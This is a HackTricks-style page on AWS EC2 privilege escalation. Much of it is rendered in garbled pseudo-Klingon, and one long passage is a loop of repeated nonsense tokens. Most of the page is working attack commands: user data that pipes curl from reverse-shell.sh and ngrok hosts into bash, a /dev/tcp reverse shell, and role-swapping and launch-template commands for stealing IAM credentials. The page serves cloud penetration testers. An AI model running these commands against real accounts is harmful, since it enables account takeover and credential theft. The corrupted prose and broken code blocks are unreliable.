# AWS - EC2 Privesc

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## EC2

For more **info about EC2** check:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

An attacker could **create and instance attaching an IAM role and then access the instance** to steal the IAM role credentials from the metadata endpoint.

* **Access via SSH**

Run a new instance using a **created** **ssh key** (`--key-name`) and then ssh into it (if you want to create a new one you might need to have the permission `ec2:CreateKeyPair`).
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **Qap via rev shell in user data**

QapDI' **user data** (`--user-data`) vItlhutlh **rev shell** vItlhutlh 'ej vItlhutlh **instance** chaw'be'. vaj vItlhutlh security group jatlh.
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
be'warned with GuradDuty if you use the credentials of the IAM role outside of the instance:

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**Potential Impact:** Direct privesc to a any EC2 role attached to existing instance profiles.

#### Privesc to ECS

With this set of permissions you could also **create an EC2 instance and register it inside an ECS cluster**. This way, ECS **services** will be **run** in inside the **EC2 instance** where you have access and then you can penetrate those services (docker containers) and **steal their ECS roles attached**.

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

To learn how to **force ECS services to be run** in this new EC2 instance check:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

If you **cannot create a new instance** but has the permission `ecs:RegisterContainerInstance` you might be able to register the instance inside the cluster and perform the commented attack.

**Potential Impact:** Direct privesc to ECS roles attached to tasks.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

Similar to the previous scenario, an attacker with these permissions could **change the IAM role of a compromised instance** so he could steal new credentials.\
As an instance profile can only have 1 role, if the instance profile **already has a role** (common case), you will also need **`iam:RemoveRoleFromInstanceProfile`**.

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

**vaj** **instance profile** **role** **'ej** **ghap** **jatlh** **ghap**. **'ach**, **ghap** **instance profile** **role** **ghap** **jatlh** **ghap** **'e'**. **vaj** **instance profile** **role** **ghap** **jatlh** **ghap** **'e'** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **instance** **ghap** **'ej** **'e'** **'ej** **instance profile** **ghap** **'ej** **
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**Potential Impact:** Direct privesc to a different EC2 role (you need to have compromised a AWS EC2 instance and some extra permission or specific instance profile status).

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

With these permissions it's possible to change the instance profile associated to an instance so if the attack had already access to an instance he will be able to steal credentials for more instance profile roles changing the one associated with it.

* If it **has an instance profile**, you can **remove** the instance profile (`ec2:DisassociateIamInstanceProfile`) and **associate** it \*

{% code overflow="wrap" %}
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* **ghItlh** **instance profile** **replace** **or** (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
```
aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<value> --association-id <value>
```

Translation to Klingon:

```
aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<value> --association-id <value>
```
```
````
{% endcode %}

**Potential Impact:** Direct privesc to a different EC2 role (you need to have compromised a AWS EC2 instance and some extra permission or specific instance profile status).

### `ec2:RequestSpotInstances`,`iam:PassRole`

An attacker with the permissions **`ec2:RequestSpotInstances`and`iam:PassRole`** can **request** a **Spot Instance** with an **EC2 Role attached** and a **rev shell** in the **user data**.\
Once the instance is run, he can **steal the IAM role**.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

**`ec2:ModifyInstanceAttribute`** vItlhutlh attacker vItlhutlh instances attributes. vaj, **user data** vItlhutlh, vaj 'oH **run arbitrary data**. vaj 'oH **rev shell to the EC2 instance**.

vItlhutlh attributes **modified while the instance is stopped**, so the **permissions** **`ec2:StopInstances`** vaj **`ec2:StartInstances`**.
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**Qapla'!** **QaD** **potlh** **ec2:CreateLaunchTemplateVersion**, **ec2:CreateLaunchTemplate**, **ec2:ModifyLaunchTemplate** **permissions** **lo'laHbe'** **'ej** **'ej** **'ej** **Launch Template version** **new** **create** **'ej** **rev shell** **user data** **'ej** **EC2 IAM Role** **'e'** **any**, **default version** **change**, **Autoscaler group** **'ej** **Launch Template** **using** **configured** **'e'** **'ej** **latest** **or** **default version** **re-run** **instances** **execute** **rev shell**.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**Potential Impact:** Direct privesc to a different EC2 role.

### `autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`

An attacker with the permissions **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** can **create a Launch Configuration** with an **IAM Role** and a **rev shell** inside the **user data**, then **create an autoscaling group** from that config and wait for the rev shell to **steal the IAM Role**.

---

**Qapla'!**
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**Qapla'!** QaD privesc laH 'e' vItlhutlh EC2 role.

### `!autoscaling`

**`ec2:CreateLaunchTemplate`** je **`autoscaling:CreateAutoScalingGroup`** **ghaHmoHlaHbe'chugh IAM role privesc** vItlhutlh, 'ach Launch Configuration or Launch Template DaH jImej **`iam:PassRole` je `ec2:RunInstances`** permissions vItlhutlh (DaH jImej privesc) 'e' vItlhutlh.

### `ec2-instance-connect:SendSSHPublicKey`

**`ec2-instance-connect:SendSSHPublicKey`** permissions vaj 'e' vItlhutlh attacker ssh key user vaj 'oH access vItlhutlh (instance ssh access vaj) 'ej privesc vItlhutlh.
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**Qapla'!** **QaD** **potlh** **EC2 IAM roles** **ghaH** **privesc** **'e'** **running instances**.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

**'e'** **permission** **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** **'e'** **'ej** **'ej** **ssh key** **'oH** **serial connection** **'e'** **'ej**. **serial** **enable** **'e'**, **permission** **`ec2:EnableSerialConsoleAccess`** **'ej** **'oH** **enable** **'e'**.

**serial port** **connect** **'e'** **'ej** **'oH** **username** **'ej** **password** **'ej** **user** **'e'** **'oH** **need**.

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

**tlhIngan Hol translation:**

{% endcode %}

vaj vItlhutlh: vaj vItlhutlhbe'chugh, 'oH username 'ej password vItlhutlhlaH.

**qetbogh:** (Highly unprovable) EC2 IAM roles attached to running instances vItlhutlh.

## References

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>qaStaHvIS 'ej zero laH HackTricks AWS hacking</strong></a><strong>!</strong></summary>

HackTricks vItlhutlh vay' vay' 'oH:

* 'ej **HackTricks** **company advertised** **SUBSCRIPTION PLANS** [**vItlhutlh**](https://github.com/sponsors/carlospolop) **pe'vIl** **download**.
* **official PEASS & HackTricks swag** [**vItlhutlh**](https://peass.creator-spring.com)
* **The PEASS Family** [**NFTs**](https://opensea.io/collection/the-peass-family) **exclusive** **collection** [**vItlhutlh**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** [**vItlhutlh**](https://t.me/peass) **follow** **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>
